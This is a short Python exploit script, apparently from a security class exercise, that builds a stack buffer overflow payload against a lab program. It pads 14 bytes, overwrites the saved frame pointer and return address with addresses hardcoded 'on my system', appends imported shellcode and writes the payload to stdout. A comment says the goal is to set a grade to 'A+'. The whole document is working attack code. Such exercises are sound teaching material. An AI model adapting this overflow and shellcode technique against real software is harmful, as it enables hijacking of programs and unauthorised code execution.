import sys
from struct import pack
from shellcode import shellcode

# Construct the payload
name = b'A' * 14
ebp = pack("<I", 0xffffd228)  # address of ebp on my system
ret = pack("<I", 0x08048494)  # address of ret on my system
grade = ret
payload = name + ebp + ret + shellcode + b'A' * 4 + b'A+'  # set grade to A+

# Launch the attack!
sys.stdout.buffer.write(payload)
